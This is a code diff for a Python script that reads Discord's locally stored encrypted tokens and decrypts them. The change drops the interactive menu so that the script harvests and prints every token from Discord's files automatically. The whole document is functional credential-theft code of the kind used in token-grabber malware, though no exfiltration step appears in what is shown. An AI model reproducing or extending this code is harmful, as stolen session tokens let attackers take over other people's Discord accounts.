@@ -37,20 +37,14 @@ def get_discord_tokens():
         return [], str(e)
 
 def main():
-    askUser = input("[1] Decrypt Custom Token\n[2] Decrypt token from Discord files\n\n> ")
-
-    if "1" in askUser:
-        val = input("Encrypted Token: ")
-        password = input("Password to Token: ")
-        print(decrypt(b64decode(val.split('dQw4w9WgXcQ:')[1]), b64decode(password)[5:]))
-
-    elif "2" in askUser:
-        tokens, key = get_discord_tokens()
-        if not tokens:
-            print("No tokens found or an error occurred.")
-            return
-        for token in tokens:
-            print(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]))
+    
+    tokens, key = get_discord_tokens()
+    if not tokens:
+        print("No tokens found or an error occurred.")
+        return
+    for token in tokens:
+        print(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]))
 
 if __name__ == "__main__":
     main()
+
